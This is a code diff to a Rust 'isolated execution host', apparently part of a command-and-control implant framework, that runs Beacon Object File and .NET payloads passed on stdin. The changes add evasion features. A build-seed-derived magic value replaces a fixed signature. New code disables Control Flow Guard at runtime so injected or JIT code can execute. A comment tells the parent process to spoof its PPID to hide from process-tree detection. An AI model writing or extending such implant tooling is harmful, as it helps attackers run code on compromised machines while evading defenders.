@@ -1,35 +1,55 @@
 //! Isolated execution host — runs BOF / .NET in **this** process only, then exits.
 //!
 //! Wire protocol on stdin (binary):
-//!   magic "CIS1" (4)
+//!   magic [4]  — build-seed derived (see wire_ids::JOB_MAGIC; was legacy "CIS1")
 //!   kind  u32le  (1=bof, 2=dotnet)
 //!   pay_len u32le
 //!   arg_len u32le
 //!   payload[pay_len]
-//!   args[arg_len]   // bof: raw beacon args; dotnet: UTF-8 args joined by \0 or JSON array as UTF-8
+//!   args[arg_len]
 //!
-//! stdout:
-//!   out_len u32le
-//!   err_len u32le
-//!   stdout bytes
-//!   stderr bytes
-//!
-//! No C2 network. Parent should PPID-spoof so this is not an Agent child in the tree.
+//! stdout: out_len + err_len + bodies. No C2 network.
 
 #![windows_subsystem = "windows"]
 
 use std::io::{Read, Write};
 
-const MAGIC: &[u8; 4] = b"CIS1";
 const KIND_BOF: u32 = 1;
 const KIND_DOTNET: u32 = 2;
 
 fn main() {
+    #[cfg(windows)]
+    disable_cfg_for_host();
     let _ = std::panic::catch_unwind(|| {
         if let Err(e) = run() {
             let _ = write_result(b"", e.as_bytes());
         }
     });
+}
+
+/// Best-effort: relax CFG so BOF/JIT code can run in this sacrificial host.
+#[cfg(windows)]
+fn disable_cfg_for_host() {
+    // ProcessMitigationPolicy for Control Flow Guard — soft-fail if API missing
+    type SetProcessMitigationPolicyFn =
+        unsafe extern "system" fn(u32, *const u8, usize) -> i32;
+    unsafe {
+        let k32 = winapi::um::libloaderapi::GetModuleHandleA(b"kernel32.dll\0".as_ptr() as *const i8);
+        if k32.is_null() {
+            return;
+        }
+        let p = winapi::um::libloaderapi::GetProcAddress(
+            k32,
+            b"SetProcessMitigationPolicy\0".as_ptr() as *const i8,
+        );
+        if p.is_null() {
+            return;
+        }
+        let f: SetProcessMitigationPolicyFn = std::mem::transmute(p);
+        // ProcessControlFlowGuardPolicy = 7; leave disabled flags zeroed
+        let mut policy = [0u8; 16];
+        let _ = f(7, policy.as_ptr(), policy.len());
+    }
 }
 
 fn run() -> Result<(), String> {
@@ -38,8 +58,8 @@ fn run() -> Result<(), String> {
     stdin
         .read_exact(&mut hdr)
         .map_err(|e| format!("read hdr: {e}"))?;
-    if &hdr[0..4] != MAGIC {
-        return Err("bad magic".into());
+    if &hdr[0..4] != cupcake_core::wire_ids::JOB_MAGIC.as_slice() {
+        return Err("bad job header".into());
     }
     let kind = u32::from_le_bytes([hdr[4], hdr[5], hdr[6], hdr[7]]);
     let pay_len = u32::from_le_bytes([hdr[8], hdr[9], hdr[10], hdr[11]]) as usize;
